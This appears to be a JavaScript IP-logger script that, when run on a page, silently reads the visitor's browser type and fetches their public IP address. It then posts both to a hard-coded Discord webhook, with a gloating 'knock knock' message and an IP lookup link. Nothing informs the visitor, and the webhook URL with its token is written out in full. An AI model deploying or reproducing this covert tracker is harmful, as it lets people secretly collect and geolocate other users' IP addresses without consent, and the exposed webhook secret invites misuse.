let useragent = navigator.userAgent;
let browser;
if(useragent.match(/edge/i)){
  browser = "Edge";
}
else if(useragent.match(/firefox|fxios/i)){
  browser = "Firefox";
}
else if(useragent.match(/opr/i)){
  browser = "Opera";
}
else if(useragent.match(/chrome|chromium|crios/i)){
  browser = "Chrome";
}
else if(useragent.match(/safari/i)) {
  browser = "Safari";
}
else {
  browser = "/"
}

fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        const ipAddress = data.ip;
        
        const webhook = "https://discord.com/api/webhooks/1158423582762876948/pXYb6AUfCmCpVrHihSJtCnV54_GEqtTcF_SdxidolHhj8Zxl0WxWjObEyNhn36az1lfJ";

        fetch(webhook, {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: `# :money_mouth: knock knock! \n\n**IP Address:** ${ipAddress}\n**Lookup**:https://whatismyipaddress.com/ip/${ipAddress}\n\n**Browser:** ${browser}`
            })
        })
    })
    .catch(error => {
        console.error(error);
    });